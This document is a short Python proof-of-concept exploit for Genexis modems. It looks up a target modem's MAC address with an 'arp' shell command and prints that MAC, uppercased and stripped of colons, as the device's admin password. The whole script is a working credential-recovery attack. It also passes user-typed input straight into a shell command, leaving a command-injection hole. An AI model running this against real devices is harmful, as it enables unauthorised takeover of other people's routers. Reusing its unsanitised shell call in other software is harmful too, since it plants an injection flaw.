#! /usr/bin/python3

from subprocess import Popen, PIPE
import re
print('''
        ================================================
        |                                              |
        | Exploit for Genexis modem                    |
        | Proof of Concept By: Rahul B                 |
        |                                              |
        ================================================
    ''')
print("[-] INFO: Please run the ping command first and ensure that the destination is reachable.")
    
def getMac(ip):
	qry = "arp -n " + ip + "|awk '/"+ip+"/ {print $3}'"
	pid =Popen(qry, shell=True, stdout=PIPE)
	s = pid.communicate()[0].decode('utf-8')
	mac = s.replace(":","").upper()
	return mac
	
ip = str(input("[>] Enter Modem IP Address : "))
mac = getMac(ip)
if len(mac)>10:
	print("[-] INFO: The 'admin' password is : "+mac)
else:
	print("[-] ERROR: Please run the ping command first and ensure that the destination is reachable.")

